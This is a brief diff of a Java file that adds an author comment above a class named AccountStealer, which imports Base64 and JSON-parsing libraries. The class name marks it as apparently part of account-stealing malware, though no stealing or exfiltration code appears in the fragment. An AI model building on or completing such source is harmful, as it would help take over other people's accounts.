@@ -18,6 +18,9 @@ import org.apache.commons.codec.binary.Base64;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 
+/**
+ * @author ItzGonza
+ */
 public class AccountStealer {
 	
 	public transient static AccountStealer instance;
